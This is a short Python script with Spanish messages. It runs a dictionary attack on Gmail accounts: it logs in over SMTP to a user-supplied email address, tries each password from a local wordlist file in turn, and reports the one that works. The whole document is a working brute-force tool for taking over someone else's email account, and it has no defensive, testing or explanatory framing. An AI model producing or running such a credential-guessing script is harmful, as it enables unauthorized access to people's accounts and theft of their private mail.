import smtplib

smtserver = smtplib.SMTP("smtp.gmail.com", 587)
smtserver.ehlo()
smtserver.starttls()

print("\n")

email = input("Email: ")

dic = open("./diccionario.txt", "r")

for pwd in dic:
    try:
        smtserver.login(email, pwd)
        print("Contraseña Correcta: %s" % pwd)
        break
    except smtplib.SMTPAuthenticationError:
        print ("Contraseña Incorrecta: %s"  % pwd)

